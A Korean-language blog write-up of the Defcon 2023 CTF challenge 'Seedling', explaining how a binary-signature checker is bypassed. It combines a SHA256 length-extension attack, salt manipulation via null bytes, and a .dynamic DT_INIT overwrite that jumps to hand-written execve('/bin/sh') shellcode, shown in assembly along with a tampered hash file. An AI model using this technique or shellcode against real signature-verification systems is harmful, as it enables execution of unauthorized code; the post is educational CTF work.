---
layout: post
category: [ctf]
title:  "Defcon 2023 Seedling 풀이"
date:   2023-06-14
author: SeHwa
og_image: assets/img/posts/3/cover.jpg
---

얼마 전 5월 말에 했던 Defcon 2023 CTF 에 출제된 Seedling 이라는 문제가 있었다. 새벽에 잠이 쏟아지는 와중에 많은 시행착오 끝에 풀었었는데 꽤 재미있는 문제였다고 생각해서 풀이를 간단히 써서 남겨두기로 했다.

<br>

* TOC
{:toc}

<br><br>

## Description

이번 CTF 의 문제는 모두 Github 에 공개되어 있다. Seedling 은 아래 링크에 존재한다.

<div class="sx-button">
  <a href="https://github.com/Nautilus-Institute/quals-2023/tree/main/seedling/src" class="sx-button__content github">
    <img src="/assets/img/icons/github.svg"/>
    <p>Nautilus-Institute/quals-2023</p>
  </a>
</div>

<br>

문제 설명은 아래와 같다.

|Here we have quite a hidden gem. This large conservatory complex used to be a bustling research facility for flora-computer interface. However after losing funding, the complex fell into disarray.<br><br>After we got a hold of it, we were unable to get the main computing system working again. During the process of exploring the complex, we have located a backup mechanism which allows us to provide a new executable.<br><br>However it seems to reject anything we give it. The only file we managed to find that worked was found in a drive in the head researcher's desk. This binary appears to have no real use, but perhaps you can figure out a way to get something more substantial running...|

위의 링크에서 tar.gz 압축된 파일이 문제에서 주어진 파일이다. 압축 파일 내에는 hashes.txt, signed_binary, verify 의 3개의 파일이 존재한다.

대회 당시에는 서버에 접속해야 했지만 지금은 물론 서버는 없고, 원래 서버도 단순히 주어진 verify 바이너리를 key.bin 만 입력으로 주고 실행하는 것이기 때문에 지금은 위의 Github 에서 key.bin 도 제공하고 있으므로 단순히 이를 입력으로 주고 로컬에서 실행하면 동일하다.

```
./verify key.bin
```

또한 위와 같이 입력하면 binary 와 hashes 는 별도로 표준 입력으로 받도록 되어있는데, 실행 시 인자로 파일명을 제공해도 되고 그게 훨씬 편하므로 여기서는 그렇게 실행하는 것으로 가정한다.

```
./verify key.bin signed_binary hashes.txt
```

<br>

## Analysis

위와 같이 실행하면 아래의 결과를 얻을 수 있다.

```
Verifying binary...
Successfully verified binary!
Hello hackers
```

그리고 ./signed_binary 를 실행해보면 아래와 같다.

```
Hello hackers
```

문제 설명대로 verify 는 key 와 binary, 그리고 이 binary 와 key 를 이용해서 사전에 계산된 해시 파일을 받는다. signed_binary 는 그냥 Hello hackers 만 출력하고 종료하는 평범한 실행 파일이고 위의 verify 실행 결과는 주어진 binary 와 key 로 적절히 여러 해시를 계산하고 이 결과를 주어진 hashes.txt 와 비교해서 동일하면 인증이 된 것으로 간주해서 해당 바이너리를 실행한다.

즉 이 문제의 목표는 쉘코드 등 시스템 제어 권한을 얻을 수 있는 코드가 들어간 바이너리를 어떤 식으로든 위의 인증을 통과해서 실행하게 만드는 것으로 생각할 수 있다. hashes.txt 의 내용은 아래와 같다.

```
0:F5CF3A81A57C45A7CE835A2DA5BB41055B5CA026E8B75DA5C05CF2CC73AD652F
1:876B824C1550432FC483259A5E5AD80E833B3EC77F37F4A980FA389860FC5380
...
32:8733716C19762444472414F395DC6A7F56CB294CB08FCD85711AAFF98984CA60
33:BDD5D27760ABB545F74460B5404301EDE9D0C3B4670D4F2ED876F172AE0742F7
```

":" 를 기준으로 왼쪽에는 번호가 있고 오른쪽에는 해시값으로 추정되는 문자열이 있다.

이제 verify 바이너리에서 몇몇 중요한 함수들의 동작을 먼저 정리해본다.

<br>

### 1. get_salt

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/1.jpg" data-lity>
  <img src="/assets/img/posts/3/1.jpg" style="width:300px" />
</a>
</div>

이 함수의 원형은 대략 아래와 같은 형태이다.

```c++
unsigned char *get_salt(unsigned char *str, FILE *fp, char index);
```

우선 첫 번째 인자로 문자열을 받아서 우선 결과 문자열의 가장 앞에 복사하고, 이후 위의 hashes.txt 파일에서 ":" 로 구분되는 index:hash 구조에서 index 부분을 가져와서 결과 문자열 뒤에 붙인다. 이는 코드에서 보다시피 딱히 정수값만 받는 게 아니라 단순히 : 가 나올때까지의 모든 문자열을 그대로 받고, 128자 이내라면 어떤 문자열이든 넣을 수 있다.

그리고 3번쨰 인자로 받은 1byte 값을 2글자 hex 로 변환해서 결과 문자열 뒤에 붙인다. 이는 디버거에서 바로 확인할 수 있다. 이 결과 문자열은 get_salt 라는 함수명에서 확인할 수 있다시피 해시 salt 로 사용된다.

또한 이 함수가 hashes.txt 파일에서 어느 부분을 읽는지는 2번째 인자로 받는 파일 스트림의 현재 포인터에 의존하므로, 실제로는 호출할 때마다 위치가 정확히 index 의 시작 부분이어야 한다. 물론 이 바이너리에선 알아서 그렇게 맞춰지도록 구현되어 있다.

예시로 get_salt 를 실제로 호출하는 부분 중 하나를 보면 아래와 같다.

```c
get_salt("elf", fp, 0);
```

이렇게 호출하고 현재 파일 포인터는 hashes.txt 파일의 시작이라고 가정하면, index 는 0 이므로 "elf" 에 "0" 이 붙고, 그리고 3번째 인자가 0 이므로 이를 2글자 hex 로 변환하면 00 이 된다. 따라서 최종 결과 문자열은 "elf000" 이 된다.

<br>

### 2. check_next_hash

이 함수의 원형은 대략 아래와 같은 형태이다.

```c++
bool check_next_hash(unsigned char hash[32], FILE *fp, bool not_print_err);
```

fp 는 hashes.txt 파일이고, get_salt 에서 ":" 까지 읽고 난 이후의 포인터이므로 해시 부분을 읽는 것이 된다. 이 hex 문자열을 읽어서 32bytes 값으로 변환하고, 이를 첫 번째 인자 hash 와 비교해서 동일한지 아닌지를 체크한다. 즉 입력받은 signed_binary 를 이용해서 key.bin 을 기반으로 해시를 계산하고, 이를 hashes.txt 에 있는 해시와 비교해서 검증하는 함수이다.

이 함수는 해시 검증에 실패할 경우 무조건 exit(1) 로 프로그램을 종료한다. 다만 not_print_err 인자가 0 인 경우, 어떤 해시가 틀렸는지를 출력해준다.

<br>

### 3. hash_from_file

이 함수의 원형은 대략 아래와 같은 형태이다.

```c++
unsigned char *hash_from_file(FILE *fp, int offset, int size, unsigned char *salt);
```

이 함수에서는 여러가지 데이터를 가지고 해시를 계산한다. 사용하는 해시 함수는 SHA256 이고, 따라서 blocksize 는 64bytes 이므로 데이터를 붙이면서 64bytes 가 되면 해당 블록을 해시화하고 다시 계속 진행하며 마지막에 final 로 최종 해시를 얻는다. 과정을 순서대로 하나씩 보면 아래와 같다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/2.jpg" data-lity>
  <img src="/assets/img/posts/3/2.jpg" style="width:300px" />
</a>
</div>

우선 4번째 인자인 salt 를 붙인다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/3.jpg" data-lity>
  <img src="/assets/img/posts/3/3.jpg" style="width:250px" />
</a>
</div>

그리고 key.bin 에서 읽은 30bytes 의 key 를 덧붙인다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/4.jpg" data-lity>
  <img src="/assets/img/posts/3/4.jpg" style="width:350px" />
</a>
</div>

위에는 없지만 함수 초기에 fseek 으로 fp 를 SEEK_SET 부터 offset 위치로 파일 포인터를 이동하는데, 여기서 해당 offset 부터 size 만큼 데이터를 읽어서 덧붙인다. 여기서 fp 는 signed_binary 파일에서 읽는다.

즉 결과적으로 정리하면 아래와 같다.

```
SHA256([salt][key][filedata])
```

<br>

이제 사실상 메인인 verify_binary 함수를 보자. 여기서부터는 [ELF 구조](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)가 중요하다.

### 4. verify_binary

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/5.jpg" data-lity>
  <img src="/assets/img/posts/3/5.jpg" style="width:600px" />
</a>
</div>

먼저 "elf000" 이라는 salt 를 붙여서 만드는 해시의 데이터는 signed_binary 의 0x00~0x40 영역인데, 이는 ELF64 헤더 영역이다. 헤더를 읽어서 해시 검증을 하고, 이후 ELF64 헤더가 맞는지 몇 가지 값을 검증하는 등의 절차를 거친다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/6.jpg" data-lity>
  <img src="/assets/img/posts/3/6.jpg" style="width:500px" />
</a>
</div>

그리고 "phdrs100" 이라는 salt 를 붙여서 만드는 해시의 데이터는 이름 그대로 program header table 을 읽는다. 앞에서 읽은 ELF 헤더에서 e_phoff 를 offset 으로 하고 size 는 e_phnum * 56 으로 설정해서 읽는다. 그 외에 ELF 헤더와 마찬가지로 몇 가지 값을 검증한다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/7.jpg" data-lity>
  <img src="/assets/img/posts/3/7.jpg" style="width:500px" />
</a>
</div>

다음으로 "shdrs200" 이라는 salt 를 붙여서 만드는 해시의 데이터는 이름 그대로 section header table 을 읽는다. phdrs 와 비슷하게 e_shoff 를 offset 으로 하고 e_shnum * 64 를 size 로 해서 읽는다.

그리고 마지막 부분에서 fseek 을 호출해서 e_shoff, 즉 section header table 의 시작 부분을 파일 포인터로 설정한다. 

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/8.jpg" data-lity>
  <img src="/assets/img/posts/3/8.jpg" style="width:450px" />
</a>
</div>

여기부터 section header table 을 순회하면서, 각 section 의 offset 과 size 값(정확히는 다음 섹션의 offset - 현재 섹션의 offset 으로 계산)을 이용해서 section 의 데이터를 읽고 해시를 만들어서 일일이 hashes.txt 의 해시들과 검증한다.

앞에서 elf, phdrs, shdrs 를 읽었으므로 salt 에서 쓰는 index 는 원래 주어진 hashes.txt 를 기준으로 3 이다. 그리고 뒤에 붙는 2글자 hex 는 00 부터 시작해서 1씩 증가한다. 이는 section header table 을 기준으로 하는 새로운 index 값이라고 볼 수 있다. 즉 주어진 hashes.txt 를 기준으로 처음 읽는 section 의 salt 는 "s300" 이 되고, 두 번째는 "s401" 이 된다.

<br>

## Scenario

verify 바이너리 자체는 그리 특별한 내용은 없고 위의 분석 내용이 전부이다. 이제 문제를 풀기 위해서는 signed_binary 를 변조하기 위해 해시 검증 루틴을 우회해야 하는데, 체크해보면 signed_binary 의 모든 부분을 거의 빈틈없이 해시 검증을 하기 때문에 단순히 변조할 방법은 없다. 따라서 몇 가지 아이디어를 생각해보도록 한다.

<br>

### Hash Length Extension Attack


우선 해시 데이터 구조를 다시 한 번 보자.

```
SHA256([salt][key][filedata])
```

위 분석에서 봤듯이 hashes.txt 의 index 는 정수값이 아니라 어떤 문자열이든 들어갈 수 있는데, 정상적인 hashes.txt 를 기준으로 할 때 각 section 의 salt 가 어떻게 되는지 나열해보면 아래와 같다.

```
s300
s401
...
s1007
s1108
...
s180F
s1910
...
```

그리고 여기서 한 가지 중요한 점은, get_salt 함수에서 index 를 읽을 때는 ":" 가 나올 때까지 모든 문자를 읽지만 이 salt 를 hash_from_file 에서 복사할때는 strlen(salt) 까지 복사하기 때문에 NULL 문자를 넣으면 get_salt 에서 뒤에 붙이는 2글자 hex 를 없앨 수 있다.

예를 들어 원래 "s300" 의 salt 가 붙는 첫 번째 section 에서, hashes.txt 파일의 3: 부분의 index 를 "180F\0:" 으로 바꾸면 원래 "s180F" 가 붙던 section 의 해시와 [salt][key] 부분까지는 동일한 값으로 해시를 만들게 된다.

이를 이용하면 [Hash Length Extension Attack](https://en.wikipedia.org/wiki/Length_extension_attack) 을 생각할 수 있는데, 한 가지 예시를 들어보자. 우선 `readelf -S signed_binary` 로 section 정보를 확인해보자.

```
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000000318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338
       0000000000000020  0000000000000000   A       0     0     8
  ...
  [15] .text             PROGBITS         0000000000001060  00001060
       0000000000000107  0000000000000000  AX       0     0     16
  ...
```

2번째 section 인 .interp 으로 예를 들어보면, 이 section 은 offset 이 0x318 이고, size 는 0x1c 이지만 실제로 계산되는 것은 다음 section 의 offset 인 0x338 에서 0x318 을 뺀 0x20 이다. signed_binary 에서 0x318~0x338 영역의 데이터는 아래와 같다.

```
2F 6C 69 62 36 34 2F 6C 64 2D 6C 69 6E 75 78 2D 78 38 36 2D 36 34 2E 73 6F 2E 32 00 00 00 00 00
/lib64/ld-linux-x86-64.so.2\x00\x00\x00\x00\x00
```

이를 이용해 실제로 검증을 위해 계산하는 해시 데이터는 아래와 같다.

```
SHA256(["s401"][key]["/lib64/ld-linux-x86-64.so.2\x00\x00\x00\x00\x00"])
```

우리는 key 를 알 수 없으므로 직접 계산해볼 수는 없지만, 주어진 hashes.txt 의 4: 에 있는 해시값이 이 결과 해시값이라고 생각할 수 있다.

```
4:2C61CDFD83BCACC3CDEE5DD55C55C79978550599497ABBB3070E099F02B4B3AC
```

그리고 동일한 과정으로 .text section 의 해시 데이터를 생각해보면 아래와 같다.

```
SHA256(["s180F"][key][.text data])
```

여기서 이제 위에서 말한 대로, 앞의 salt 를 조작 가능하다는 것을 이용하기 위해 원래 .text section 의 계산에 이용되는 hashes.txt 부분을 보면 아래와 같다.

```
18:60961C74A81015470E28F6A77CB6CB3ECDFFB7F623C783381ACCFD49B89C7C73
```

앞의 18 을 "401\0" 으로 바꾸면, .text 의 해시를 계산할 때 앞쪽 데이터가 .interp 와 동일한 ["s401"][key] 가 된다. 그리고 .interp 의 데이터인 "/lib64/ld-linux-x86-64.so.2\x00\x00\x00\x00\x00" 를 .text 의 가장 앞에 덮어쓰게 되면 결과적으로 그 부분까지 계산되는 데이터가 .interp 의 해시를 계산할 때의 데이터와 완전히 동일하게 되므로 해당 해시를 기반으로 Hash Length Extension Attack 을 이용하면 .text 에서 덮어쓴 부분부터 section 의 끝부분까지는 원하는 데이터를 쓰고 해시를 새로 계산할 수 있게 된다.

즉 이를 이용하면 A 라는 section 의 데이터를 B 라는 section 에 덮어쓰고 이후 B section 의 남는 공간에 원하는 데이터를 써도 해시 검증을 통과할 수 있다. 물론 A section 이 B section 보다 size 가 작거나 같아야 할 것이다.

<br>

### Dynamic section

단순히 .text 에 덮어쓰면 해결될 것 같지만, 그렇게 할 수 없는 문제가 몇 가지 있다.

1. signed_binary 의 Entrypoint 가 .text section 의 시작 부분이므로 덮어쓸 데이터가 유효한 x64 명령이 아니라면 에러로 종료된다.
2. Hash Length Extension Attack 공격을 위해서는 해시의 Final 함수에서 덧붙이는 데이터(datasize 등)까지 덧붙여야 하는데, 이 덧붙여지는 데이터는 거의 절대로 유효한 x64 명령이 될 수 없으므로 덮어쓰는 section 데이터가 nop-like 명령 등 유효한 x64 명령이라고 해도 이로 인해 실행이 불가능하다.

이러한 문제로 인해 고민하다가 [Dynamic section](http://osr507doc.sco.com/en/topics/ELF_dynam_section.html) 에 주목했다. 이 section 은 아래와 같은 구조를 가진다.

```c
typedef struct {
    Elf32_Sword d_tag;
    union {
        Elf32_Word d_val;
        Elf32_Addr d_ptr;
    } d_un;
} Elf32_Dyn;

extern Elf32_Dyn _DYNAMIC[];
```

이 section 은 단순히 하나의 항목마다 8bytes 값 2개로 이루어진 table 이다. 실제로 signed_binary 의 dynamic section 을 확인해보면 아래와 같다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/9.jpg" data-lity>
  <img src="/assets/img/posts/3/9.jpg" style="width:400px" />
</a>
</div>

이 section 은 문제를 푸는데에 아주 중요한 3가지 특징을 가지고 있다.

1. 형식에 맞지 않는 값이 들어가도 실행 시 에러가 나지 않고 무시된다.
2. DT_INIT 타입 항목 수정으로 실행 흐름을 변경할 수 있다.
3. 없애도 실행에는 별 영향이 없는 항목들이 일부 존재한다.

위 signed_binary 의 dynamic section 에서 DT_INIT 항목의 값을 보면 0x1000 이 들어있는데, 이 주소를 확인해보면 아래와 같다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/10.jpg" data-lity>
  <img src="/assets/img/posts/3/10.jpg" style="width:650px" />
</a>
</div>

이 init 는 main 함수가 실행되기 전에 호출된다. 따라서 이 DT_INIT 항목을 0x1000 에서 적절한 주소로 수정하면 원하는 위치에서 코드를 실행하도록 할 수 있다. 실제로 0x1000 을 0x1077 로 변조해서 실행해보면 아래와 같다.

```
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff7fa6200
RBX: 0x0 
RCX: 0x555555555077
RDX: 0x7fffffffdf78
,,,
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7daee5e <__libc_start_main_impl+158>:	mov    rsi,r12
   0x7ffff7daee61 <__libc_start_main_impl+161>:	mov    edi,ebp
   0x7ffff7daee63 <__libc_start_main_impl+163>:	add    rcx,QWORD PTR [r14]
=> 0x7ffff7daee66 <__libc_start_main_impl+166>:	call   rcx
   0x7ffff7daee68 <__libc_start_main_impl+168>:	mov    rdx,QWORD PTR [rsp]
   0x7ffff7daee6c <__libc_start_main_impl+172>:	mov    rdi,QWORD PTR [r14+0x108]
   0x7ffff7daee73 <__libc_start_main_impl+179>:	test   rdi,rdi
   0x7ffff7daee76 <__libc_start_main_impl+182>:	je     0x7ffff7daee23 <__libc_start_main_impl+99>
```

위와 같이 main 실행 전에 __libc_start_main 에서 _init 함수를 호출할 때 0x77 이 더해진 주소를 호출하게 된 것을 확인할 수 있다. 이를 이용하면 일단 실행하려는 쉘코드 등을 어딘가에 쓰기만 하면 그 위치로 점프하게 만들 수 있다.

그러면 우선 dynamic section 에 덮어쓸 적절한 section 을 정해야 한다. 당연히 size 가 작을수록 좋고, 또한 덮어쓸 값이 dynamic table 로 인식될 일이 없는 문자열 데이터 등이 좋다. 가능한 후보는 많겠지만 CTF 당시에는 여러 이유로 size 가 0x50 으로 그리 작지는 않은 .comment section 을 이용했었다. 따라서 이를 기준으로 하도록 한다. 실제로 덮어써보면 아래와 같다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/11.jpg" data-lity>
  <img src="/assets/img/posts/3/11.jpg" style="width:600px" />
</a>
</div>

그러면 이 덮어쓴 0x50 이후부터는 원하는 데이터를 쓸 수 있다. 다만 당시에는 size 가 살짝 부족해서 실행에 상관없는 DT_GNU_HASH, DT_DEBUG 항목은 제거했다. 또한 덮어쓴 데이터는 문자열이므로 8bytes 정수값 2개로 이루어지는 dynamic table 의 정상적인 항목으로 인식될 수는 없고, 따라서 실행 시에는 그냥 무시된다.

그리고 이제 DT_INIT 를 어떤 주소로 수정할지를 결정해야한다. 실행 권한이 있으면서 적절한 size 를 가지는 section 에 쉘코드를 쓰고 그 위치로 점프하면 되는데, 일단 .text 는 상술했듯이 덮어쓸 수 없으므로 대신 .plt 를 선택했다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/12.jpg" data-lity>
  <img src="/assets/img/posts/3/12.jpg" style="width:500px" />
</a>
</div>

```
[13] .plt              PROGBITS         0000000000001020  00001020
     0000000000000030  0000000000000010  AX       0     0     16
```

.plt 의 size 는 0x30 으로 그리 크지않다. 그래서 0x8 로 작은 size 를 가지는 .bss section 을 덮어쓰기로 했다. 또한 Hash Length Extension Attack 을 위해 덧붙여지는 데이터까지 고려하면 실질적으로 남는 공간은 19bytes 정도밖에 되지 않는다. 일단 이 정도면 충분히 쉘코드를 넣을 공간은 된다고 판단하고 선택했다.

쉘코드는 19bytes 공간에 맞추기 위해 직접 다시 만들었고 아래와 같다.

```asm
xor rsi, rsi
push rcx
pop rdx
add dx, 2F8Bh
push rdx
pop rdi
push 3Bh
pop rax
push rsi
pop rdx
syscall
```

이 쉘코드는 완전히 독립적이지 않고 __libc_start_main 에서 call rcx 로 쉘코드가 호출되기 직전의 레지스터 상태에 의존하며, "/bin/sh" 문자열도 dynamic section 에 넣은 다음 해당 위치를 가리키도록 했다. 물론 이 문자열은 dynamic table 로 인식되지 않으므로 아무 상관이 없다.

<br>

## Exploit

이제 시나리오대로 실제로 수정을 하기 위해 Hash Length Extension Attack 을 해야 하는데, 처음에 테스트를 위해 직접 손으로 하다가 후배가 추천한 hash_extender 를 사용했다.

<div class="sx-button">
  <a href="https://github.com/iagox86/hash_extender" class="sx-button__content github">
    <img src="/assets/img/icons/github.svg"/>
    <p>iagox86/hash_extender</p>
  </a>
</div>

이 툴을 이용해서 변조하려는 salt 와 이어붙이려는 데이터를 주고 새로운 해시값 및 덮어쓸 데이터를 얻을 수 있다. 

우선 이를 이용해서 signed_binary 에서 수정된 부분을 .dynamic 부터 보면 아래와 같다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/13.jpg" data-lity>
  <img src="/assets/img/posts/3/13.jpg" style="width:500px" />
</a>
</div>

DT_INIT 가 0x103D 로 변경되었고 제일 뒤에 "/bin/sh\0" 문자열이 들어가있는 것을 볼 수 있다.

<div markdown=1 class="sx-center">
<a href="/assets/img/posts/3/14.jpg" data-lity>
  <img src="/assets/img/posts/3/14.jpg" style="width:500px" />
</a>
</div>

.plt 에는 0x103D 부터 쉘코드가 들어가있는 것을 볼 수 있다.

이렇게 수정하고 나면 signed_binary 를 로컬에서 그냥 실행했을 때도 당연히 쉘이 떠야한다.

```
./signed_binary
$
```

그리고 이제 수정한 hashes.txt 는 아래와 같다.

```
0:F5CF3A81A57C45A7CE835A2DA5BB41055B5CA026E8B75DA5C05CF2CC73AD652F
1:876B824C1550432FC483259A5E5AD80E833B3EC77F37F4A980FA389860FC5380
2:D56B039378D7BB006BEBE7F0CB35D81FFB0F8C3D8EE949CC7F45C6D22B89EAF5
3:F466F2894B602058B7FE3365403392519F84F428317D9A1F013CE8D0581C415E
4:2C61CDFD83BCACC3CDEE5DD55C55C79978550599497ABBB3070E099F02B4B3AC
5:08CB83EA5D30FDC477109F662422E46340F7A714BD8A45A4EEEB52E59A1E3A14
6:D0DDE5DBD98470AE4F8EC1E6BEBA921A39B257FEB0501B7DD9863751D1BF56FD
7:AF636621A22141FB540100998D6D4108F842D98C939871FF3D9173034A4522C5
8:654EE494FEBAD687DB31EC637EBAFA01EA62EF73CA7B5DA04922A3E2FC8A769C
9:D6A81000BD0180DE885D52EEADDF650723C3ADFF2ED98BD6865DF74B2C90772B
10:8F8ADA51EA853B23AA4816ECAC0923B760ED5B42B7E21FF9864729731DAA4389
11:42D65256E81CCFFCA04158FAE7CA4BDF2B8EDD2837A9397C103E85AD569269F5
12:D20744685A824C76E0975048CA98CDC22B4DC186DEF2B24527CDD39261F15DB1
13:53FAD76F4587E25FD0D413F6D8A18A09D5D59F0C717262236D8403B6DB747474
14:E54917A244C0CEE23057BC420070900FD381BF36CDACADD9D57D33D021960531
15:A9F9011DD2517E9656353FE5482EEE4B37653403CDA4D7E5BBD18B4BD77E4553
291A :731f4a9c7478fc913ef7c4836846ed8a00aa3cfba0ae5ebd3c003127fdd61c6d
17:25A553A4FAE5B287AD18287DE5D3728F3B26CA5FF37EBC54E5E982697071AB60
18:60961C74A81015470E28F6A77CB6CB3ECDFFB7F623C783381ACCFD49B89C7C73
19:B2EB2CF32FC9EFDB99CC0F0F1F802C7357330046936378D115A7AF1DB6B5D2D6
20:DC5E123AAFD45307F772E1B32737967C6412A626B98C0D8A106215EC247A2E0C
21:352FF2D5EF62429E21D58418131D8F52202E32ABA55F41C6D802B39DFAA38172
22:1ADECDE287B8E32AC59255F56220F7053A47AAAB5E2238F9C7C17D79E5EA8B95
23:18872585837E8F77439ED5AB4E5DD5E3AACA6F961702D946D0C8513C618A7E26
24:217C2FD31BF700108BE0425FE9559BB4B3D5F431BB5BF31CD55058165BB576D1
301B :8408a7a2dc7828a68085d80d968d7b6a3fb206d66d6f755ca19f4b75bc316f07
26:01C4BE9AE1992F7E035AD6CC5125A8CF795E22E7F234BB82F4C8529DDB92B300
27:B53BA8930F5190265775A108D9DEB39AB970EBCA80D5BA91F3236C3A060C255E
28:8CD4C45FE3AF79EBF27EA6110665D52E7F3E989007166E0EA0204433DAAEFA7E
29:833F4DE990972C9C66D6EC02DDF50CC8D52962B7BA9826104F685C22E4138773
30:B471EBB612EF13E00B64EDF54F9F468CB0814561E95A34D396A906BFCC4FD96D
31:E4C1A7C2DD072E8BC0FEE2D48F1980EA38284EA3521A359C2F61CC7A118ECD90
32:8733716C19762444472414F395DC6A7F56CB294CB08FCD85711AAFF98984CA60
33:BDD5D27760ABB545F74460B5404301EDE9D0C3B4670D4F2ED876F172AE0742F7
```

원래 16: 과 25: 이었던 부분이 수정된 것을 볼 수 있다. 공백은 실제로는 공백이 아니라 \x00 이다.

CTF 당시에는 이렇게 수정된 signed_binary 와 hashes.txt 를 서버에 보내서 정상적으로 쉘을 얻었고, 서버가 닫힌 현재는 `./verify key.bin signed_binary hashes.txt` 로 테스트하면 된다. 쉘을 얻고 flag 파일을 찾아서 출력했다.

```
flag{BuyOffer4643n23:wZ8tXFO3yAuFJqIdiFSlm043Qzv_5gjLv0zodKpDepLX7_3xE_LbZmD1HvW_Ler8qvmQlnpujorm2g87sGt_oQ}
```